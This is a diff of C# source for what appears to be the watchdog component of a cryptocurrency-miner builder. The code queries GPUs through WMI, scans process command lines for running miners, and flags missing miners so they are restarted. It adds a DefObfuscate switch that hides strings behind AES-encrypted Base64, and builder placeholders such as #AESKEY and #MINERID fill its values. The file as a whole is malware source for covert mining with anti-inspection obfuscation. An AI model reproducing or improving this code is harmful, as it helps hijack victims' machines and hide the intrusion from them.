@@ -53,7 +53,7 @@ public partial class _rProgram_
             var rarg6 = new ManagementObjectSearcher(_rarg5_, new ObjectQuery("#GPUQUERY")).Get();
             foreach (ManagementObject MemObj in rarg6)
             {
-                _rarg1_ += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]);
+                _rarg1_ += (" " + MemObj["#STRVIDEOP"] + " " + MemObj["#STRNAME"]);
             }
 
             bool _rarg2_ = _rarg1_.IndexOf("#STRNVIDIA", StringComparison.OrdinalIgnoreCase) >= 0 || _rarg1_.IndexOf("#STRAMD", StringComparison.OrdinalIgnoreCase) >= 0;
@@ -62,9 +62,9 @@ public partial class _rProgram_
             var _rarg7_ = new ManagementObjectSearcher(_rarg5_, new ObjectQuery("#MINERQUERY")).Get();
             foreach (ManagementObject retObject in _rarg7_)
             {
-                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains("#MINERID"))
+                if (retObject != null && retObject["#STRCMDLINE"] != null && retObject["#STRCMDLINE"].ToString().Contains("#MINERID"))
                 {
-                    _rminers_ += retObject["CommandLine"].ToString();
+                    _rminers_ += retObject["#STRCMDLINE"].ToString();
                 }
             }
 
@@ -72,7 +72,7 @@ public partial class _rProgram_
             bool _rmissing_ = false;
             foreach (string[] _set_ in _rminerset_)
             {
-                if(!_rminers_.Contains(_rGetString_(_set_[0])) && (_set_[1] == "#XID" || (_set_[1] == "#EID" && _rarg2_)))
+                if(!_rminers_.Contains(_set_[0]) && (_set_[1] == "#XID" || (_set_[1] == "#EID" && _rarg2_)))
                 {
                     _rmissing_ = true;
                     break;
@@ -129,13 +129,16 @@ public partial class _rProgram_
         _rWDLoop_();
     }
 
+#if DefObfuscate
     public static string _rGetString_(string _rarg1_)
     {
-        return Encoding.Unicode.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
+        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
     }
+#endif
 
     public static byte[] _rAESMethod_(byte[] _rinput_, bool _rencrypt_ = false)
     {
+#if DefObfuscate
         var _rkeybytes_ = new Rfc2898DeriveBytes(@"#AESKEY", Encoding.ASCII.GetBytes(@"#SALT"), 100).GetBytes(16);
         using (Aes _raesAlg_ = Aes.Create())
         {
@@ -149,6 +152,9 @@ public partial class _rProgram_
                 return _rmsDecrypt_.ToArray();
             }
         }
+#else
+        return _rinput_;
+#endif
     }
 
     public static void _rCommand_(string _rarg1_, string _rarg2_)
